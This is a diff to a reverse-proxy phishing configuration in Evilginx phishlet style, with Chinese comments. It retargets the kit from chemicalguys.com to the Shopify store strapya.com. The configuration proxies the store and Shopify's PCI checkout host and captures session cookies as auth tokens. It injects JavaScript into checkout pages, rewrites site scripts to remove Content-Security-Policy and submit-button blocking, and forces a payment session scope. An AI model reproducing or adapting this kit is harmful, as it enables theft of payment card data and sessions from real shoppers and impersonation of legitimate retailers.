@@ -1,20 +1,18 @@
 min_ver: '3.0.0'
 proxy_hosts:
   # 主域名
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'chemicalguys.com', session: true, is_landing: true, auto_filter: true }
-  - {phish_sub: '', orig_sub: '', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true }
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'chemicalguys.com', session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'strapya.com', session: true, is_landing: true, auto_filter: true }
   # 静态页面
   #- {phish_sub: 'front', orig_sub: 'front', domain: 'whoooosyourdaddy.top:8443', session: true, is_landing: false, auto_filter: true }
 
   # shopify 平台相关
   #- {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'sp', orig_sub: '', domain: 'shop.app', session: true, is_landing: false, auto_filter: false}
-  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false }
+#  - {phish_sub: 'sp', orig_sub: '', domain: 'shop.app', session: true, is_landing: false, auto_filter: false}
+#  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false }
   - {phish_sub: 'checkoutpci', orig_sub: 'checkout.pci', domain: 'shopifyinc.com', session: true, is_landing: false, auto_filter: false }
-  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false }
-  - {phish_sub: 'monorail-edge', orig_sub: 'monorail-edge', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: false }
-  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: false }
+#  - {phish_sub: 'pay', orig_sub: 'pay', domain: 'shopify.com', session: true, is_landing: false, auto_filter: false }
+#  - {phish_sub: 'monorail-edge', orig_sub: 'monorail-edge', domain: 'shopifysvc.com', session: true, is_landing: false, auto_filter: false }
+#  - {phish_sub: 'hooks', orig_sub: 'hooks', domain: 'stripe.com', session: true, is_landing: false, auto_filter: false }
   # track、日志相关
 #  - {phish_sub: 'api', orig_sub: 'api', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
 #  - {phish_sub: 'cdnin', orig_sub: 'cdn', domain: 'intelligems.io', session: true, is_landing: false, auto_filter: true }
@@ -31,25 +29,25 @@ sub_filters:
 #  hack提交按钮 （解决不能重复提交问题）
 #- {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
 #- {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
-#- {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
-#- {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
-#- {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: 'Content-Security-Policy', replace: 'CSP', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: 'Content-Security-Policy', replace: 'CSP', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
 # 去掉express checkout
-#- {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '<section.*?aria-label="Contact".*?<\/section>', replace: '', mimes: ['text/html']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '<section.*?aria-label="Contact".*?<\/section>', replace: '', mimes: ['text/html']}
 #  请求带上cookie
-#- {triggers_on: 'www.chemicalguys.com', orig_sub: 'www', domain: 'chemicalguys.com', search: '{method:"POST",body:JSON\.stringify\({Detail', replace: '{method:"POST",credentials: "include",body:JSON.stringify({Detail', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
+#- {triggers_on: 'www.strapya.com', orig_sub: 'www', domain: 'strapya.com', search: '{method:"POST",body:JSON\.stringify\({Detail', replace: '{method:"POST",credentials: "include",body:JSON.stringify({Detail', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
 
 intercept:
 # 自定义3ds页面
-#  - {domain: 'www.chemicalguys.com', mime: 'redirect', body: 'phis.chemicalguys.top', path: '\/phis\/*', http_status: 301}
-#- {domain: 'www.chemicalguys.com', path: '.*?\/sandboxes\/wallets', http_status: 404}
-#  - {domain: 'www.chemicalguys.com', path: '.*?/DeliveryMethodSelectorSection.*', http_status: 404}
+#  - {domain: 'www.strapya.com', mime: 'redirect', body: 'phis.chemicalguys.top', path: '\/phis\/*', http_status: 301}
+#- {domain: 'www.strapya.com', path: '.*?\/sandboxes\/wallets', http_status: 404}
+#  - {domain: 'www.strapya.com', path: '.*?/DeliveryMethodSelectorSection.*', http_status: 404}
 #- {domain: 'api.intelligems.io', path: '.*\/track*', http_status: 404}
 #- {domain: 'play.google.com', path: '\/log', http_status: 404}
 #  - {domain: 'api.gotolstoy.com', path: '.*', http_status: 404}
 
 js_inject:
-  - trigger_domains: ["www.chemicalguys.com"]
+  - trigger_domains: ["www.strapya.com"]
     trigger_paths: ["/checkouts/.*"]
     script: |
       const observer = new MutationObserver(() => {
@@ -73,7 +71,7 @@ js_inject:
       });
 
 auth_tokens:
-  - domain: 'chemicalguys.com'
+  - domain: 'strapya.com'
     keys: []
     type: 'cookie'
 credentials:
@@ -140,9 +138,9 @@ force_post:
   - path: '\/sessions'
     search: ''
     force:
-      - {key: 'payment_session_scope', value: 'chemicalguys.com'}
+      - {key: 'payment_session_scope', value: 'strapya.com'}
     type: 'post'
 
 login:
-  domain: 'www.chemicalguys.com'
+  domain: 'www.strapya.com'
   path: '/'
